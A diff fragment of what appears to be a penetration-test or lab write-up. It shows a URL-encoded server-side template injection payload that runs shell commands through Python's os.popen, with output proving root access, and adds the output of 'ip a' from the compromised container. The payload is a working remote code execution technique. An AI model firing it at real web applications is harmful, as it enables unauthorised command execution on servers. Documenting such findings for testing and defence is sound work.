@@ -946,3 +946,15 @@ Connection: close
 name=%7B%7Brequest.application.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%7D%7D
 ```
 Response in body provides `uid=0(root) gid=0(root) groups=0(root)`
+
+Modifying the `id` command to be `ip a`, we get the following:
+```
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+5: eth0@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+```
